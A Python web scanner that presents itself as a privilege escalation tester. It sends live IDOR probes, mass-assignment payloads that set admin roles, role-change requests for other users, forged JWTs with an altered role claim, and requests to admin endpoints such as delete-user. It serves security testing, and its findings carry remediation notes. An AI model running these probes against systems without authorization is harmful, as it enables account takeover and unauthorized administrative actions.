#!/usr/bin/env python3
"""
Privilege Escalation Tester
Tests for horizontal and vertical privilege escalation vulnerabilities
including access to other users' data and role manipulation
"""

import requests
import json
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin

class PrivilegeEscalationTester:
    """Privilege escalation vulnerability tester"""

    def __init__(self, target_url, auth_token=None, output_file=None):
        self.target_url = target_url
        self.auth_token = auth_token
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        if auth_token:
            self.session.headers.update({
                'Authorization': f'Bearer {auth_token}'
            })

    def scan(self):
        """Run privilege escalation tests"""
        print(f"[*] Starting privilege escalation testing on {self.target_url}")

        # Test horizontal privilege escalation
        self._test_horizontal_escalation()

        # Test vertical privilege escalation
        self._test_vertical_escalation()

        # Test role manipulation
        self._test_role_manipulation()

        # Test admin endpoint access
        self._test_admin_endpoint_access()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_horizontal_escalation(self):
        """Test horizontal privilege escalation (accessing other users' data)"""
        print("[*] Testing horizontal privilege escalation...")

        # Common user data endpoints
        user_endpoints = [
            '/api/user/{id}',
            '/api/users/{id}',
            '/user/{id}',
            '/profile/{id}',
            '/account/{id}',
            '/api/profile/{id}',
            '/api/account/{id}',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Test accessing other users' data
        user_ids = ['1', '2', '100', '999', 'admin', 'test']

        for endpoint_template in user_endpoints:
            for user_id in user_ids:
                endpoint = endpoint_template.replace('{id}', user_id)
                test_url = base_url + endpoint

                try:
                    response = self.session.get(test_url, timeout=10)

                    # If we get user data (not our own)
                    if response.status_code == 200:
                        # Check for PII in response
                        pii_indicators = ['email', 'phone', 'address', 'ssn', 'password']

                        if any(indicator in response.text.lower() for indicator in pii_indicators):
                            vuln = {
                                'type': 'Horizontal Privilege Escalation - IDOR',
                                'severity': 'critical',
                                'url': test_url,
                                'evidence': f'Accessed user data for ID: {user_id}',
                                'description': 'Can access other users\' personal information',
                                'cwe': 'CWE-639',
                                'impact': 'Privacy breach, PII disclosure, account enumeration',
                                'remediation': 'Implement proper authorization checks'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] CRITICAL: Horizontal escalation - User {user_id} data accessible")
                            return

                except:
                    pass

        # Test UUID-based IDOR
        print("[*] Testing UUID-based IDOR...")
        uuid_endpoints = [
            '/api/document/{uuid}',
            '/api/file/{uuid}',
            '/api/order/{uuid}',
        ]

        # Common UUID patterns
        test_uuids = [
            '00000000-0000-0000-0000-000000000001',
            '11111111-1111-1111-1111-111111111111',
            'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
        ]

        for endpoint_template in uuid_endpoints:
            for uuid in test_uuids:
                endpoint = endpoint_template.replace('{uuid}', uuid)
                test_url = base_url + endpoint

                try:
                    response = self.session.get(test_url, timeout=10)

                    if response.status_code == 200:
                        if len(response.content) > 100:  # Actual data returned
                            vuln = {
                                'type': 'Horizontal Privilege Escalation - UUID IDOR',
                                'severity': 'high',
                                'url': test_url,
                                'evidence': f'Accessed resource via UUID: {uuid}',
                                'description': 'UUID-based resources accessible without authorization',
                                'cwe': 'CWE-639',
                                'impact': 'Unauthorized access to other users\' resources',
                                'remediation': 'Validate user ownership of UUID resources'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] UUID-based IDOR detected")
                            return

                except:
                    pass

    def _test_vertical_escalation(self):
        """Test vertical privilege escalation (user to admin)"""
        print("[*] Testing vertical privilege escalation...")

        # Test direct admin access
        admin_endpoints = [
            '/api/admin',
            '/admin',
            '/api/admin/users',
            '/admin/dashboard',
            '/api/admin/settings',
            '/administrator',
            '/api/administrator',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in admin_endpoints:
            admin_url = base_url + endpoint

            try:
                response = self.session.get(admin_url, timeout=10)

                # If we can access admin endpoints
                if response.status_code == 200:
                    # Check for admin indicators
                    admin_indicators = [
                        'admin',
                        'dashboard',
                        'users',
                        'settings',
                        'configuration',
                        'manage',
                    ]

                    if any(indicator in response.text.lower() for indicator in admin_indicators):
                        vuln = {
                            'type': 'Vertical Privilege Escalation - Admin Access',
                            'severity': 'critical',
                            'url': admin_url,
                            'evidence': 'Admin endpoint accessible without admin privileges',
                            'description': 'Regular users can access admin functionality',
                            'cwe': 'CWE-269',
                            'impact': 'Full system compromise, admin control',
                            'remediation': 'Implement role-based access control (RBAC)'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Admin endpoint accessible")
                        return

            except:
                pass

        # Test parameter pollution for privilege escalation
        print("[*] Testing parameter pollution for privilege escalation...")

        user_update_endpoints = [
            '/api/user/update',
            '/api/profile/update',
            '/user/edit',
            '/account/update',
        ]

        for endpoint in user_update_endpoints:
            update_url = base_url + endpoint

            # Try to elevate privileges via parameter injection
            escalation_attempts = [
                {'role': 'admin'},
                {'is_admin': True},
                {'admin': True},
                {'privilege': 'admin'},
                {'user_role': 'administrator'},
                {'permissions': ['admin', 'write', 'delete']},
                {'is_staff': True},
                {'superuser': True},
            ]

            for params in escalation_attempts:
                try:
                    response = self.session.post(update_url, json=params, timeout=10)

                    if response.status_code in [200, 201]:
                        # Check if role was updated
                        if 'admin' in response.text.lower() or 'success' in response.text.lower():
                            vuln = {
                                'type': 'Vertical Privilege Escalation - Mass Assignment',
                                'severity': 'critical',
                                'url': update_url,
                                'evidence': f'Privilege escalation via parameter: {list(params.keys())[0]}',
                                'description': 'User role can be elevated via mass assignment',
                                'cwe': 'CWE-915',
                                'impact': 'Regular users can become administrators',
                                'remediation': 'Use allowlist for updatable fields, restrict role changes'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] CRITICAL: Privilege escalation via mass assignment")
                            return

                except:
                    pass

    def _test_role_manipulation(self):
        """Test role manipulation vulnerabilities"""
        print("[*] Testing role manipulation...")

        # Role update endpoints
        role_endpoints = [
            '/api/user/role',
            '/api/user/update-role',
            '/user/role/update',
            '/api/role/update',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in role_endpoints:
            role_url = base_url + endpoint

            try:
                # Test 1: Direct role modification
                role_data = {
                    'user_id': '123',
                    'role': 'admin'
                }

                response = self.session.post(role_url, json=role_data, timeout=10)

                if response.status_code in [200, 201]:
                    vuln = {
                        'type': 'Privilege Escalation - Direct Role Manipulation',
                        'severity': 'critical',
                        'url': role_url,
                        'evidence': 'User role can be directly modified',
                        'description': 'API allows direct role modification without authorization',
                        'cwe': 'CWE-269',
                        'impact': 'Any user can assign admin role',
                        'remediation': 'Restrict role changes to admin users only'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: Direct role manipulation possible")
                    return

                # Test 2: Self-role modification
                self_role_data = {
                    'role': 'admin'
                }

                response = self.session.put(role_url, json=self_role_data, timeout=10)

                if response.status_code in [200, 201]:
                    vuln = {
                        'type': 'Privilege Escalation - Self Role Modification',
                        'severity': 'critical',
                        'url': role_url,
                        'evidence': 'Users can modify their own role',
                        'description': 'API allows users to change their own role',
                        'cwe': 'CWE-269',
                        'impact': 'Self-service privilege escalation',
                        'remediation': 'Prevent users from modifying their own roles'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: Self role modification possible")
                    return

            except:
                pass

        # Test JWT role manipulation
        if self.auth_token:
            print("[*] Testing JWT role manipulation...")

            # Try to decode JWT (simple base64 decode of payload)
            try:
                import base64

                parts = self.auth_token.split('.')
                if len(parts) == 3:
                    # Decode payload
                    payload = parts[1]
                    # Add padding if needed
                    payload += '=' * (4 - len(payload) % 4)
                    decoded = base64.urlsafe_b64decode(payload)
                    payload_data = json.loads(decoded)

                    # Check if role/admin field exists
                    role_fields = ['role', 'admin', 'is_admin', 'isAdmin', 'permissions']

                    for field in role_fields:
                        if field in payload_data:
                            # Try to modify the JWT
                            payload_data[field] = 'admin' if isinstance(payload_data[field], str) else True

                            # Encode modified payload
                            modified_payload = base64.urlsafe_b64encode(
                                json.dumps(payload_data).encode()
                            ).decode().rstrip('=')

                            # Reconstruct JWT (with original signature - will fail if verified)
                            modified_token = f"{parts[0]}.{modified_payload}.{parts[2]}"

                            # Test with modified token
                            test_session = requests.Session()
                            test_session.headers.update({
                                'Authorization': f'Bearer {modified_token}',
                                'User-Agent': 'Mozilla/5.0'
                            })

                            admin_url = base_url + '/api/admin'
                            try:
                                response = test_session.get(admin_url, timeout=10)

                                if response.status_code == 200:
                                    vuln = {
                                        'type': 'Privilege Escalation - JWT Role Manipulation',
                                        'severity': 'critical',
                                        'url': admin_url,
                                        'evidence': 'Modified JWT with admin role accepted',
                                        'description': 'JWT signature not verified, role can be modified',
                                        'cwe': 'CWE-347',
                                        'impact': 'Complete privilege escalation via JWT manipulation',
                                        'remediation': 'Verify JWT signature, use strong signing algorithm'
                                    }
                                    self.vulnerabilities.append(vuln)
                                    print(f"[!] CRITICAL: JWT role manipulation successful")
                                    return
                            except:
                                pass

            except:
                pass

    def _test_admin_endpoint_access(self):
        """Test access to admin-only endpoints"""
        print("[*] Testing admin endpoint access...")

        # Admin actions
        admin_actions = [
            '/api/admin/delete-user',
            '/api/admin/create-user',
            '/api/admin/update-settings',
            '/api/users/delete',
            '/api/system/config',
            '/api/admin/backup',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in admin_actions:
            admin_url = base_url + endpoint

            try:
                # Try to access admin action
                response = self.session.get(admin_url, timeout=10)

                # Also try POST
                if response.status_code == 405:  # Method not allowed
                    response = self.session.post(admin_url, json={}, timeout=10)

                # If endpoint is accessible
                if response.status_code in [200, 201]:
                    vuln = {
                        'type': 'Privilege Escalation - Admin Endpoint Accessible',
                        'severity': 'critical',
                        'url': admin_url,
                        'evidence': f'Admin endpoint returned {response.status_code}',
                        'description': 'Admin-only endpoint accessible to regular users',
                        'cwe': 'CWE-284',
                        'impact': 'Unauthorized admin actions, system compromise',
                        'remediation': 'Implement proper authorization middleware'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: Admin endpoint accessible - {endpoint}")
                    return

            except:
                pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 privilege_escalation_tester.py <url> [auth_token] [output_file]")
        print("\nExample:")
        print("  python3 privilege_escalation_tester.py https://example.com")
        print("  python3 privilege_escalation_tester.py https://example.com eyJhbGciOiJIUzI1NiIs...")
        print("\nTests for:")
        print("  - Horizontal privilege escalation (IDOR)")
        print("  - UUID-based IDOR")
        print("  - Vertical privilege escalation (user → admin)")
        print("  - Mass assignment privilege escalation")
        print("  - Direct role manipulation")
        print("  - JWT role manipulation")
        print("  - Admin endpoint access")
        sys.exit(1)

    target = sys.argv[1]
    token = None
    output = None

    # Parse arguments
    if len(sys.argv) > 2:
        if sys.argv[2].endswith('.json'):
            output = sys.argv[2]
        else:
            token = sys.argv[2]
            if len(sys.argv) > 3:
                output = sys.argv[3]

    tester = PrivilegeEscalationTester(target, token, output)
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
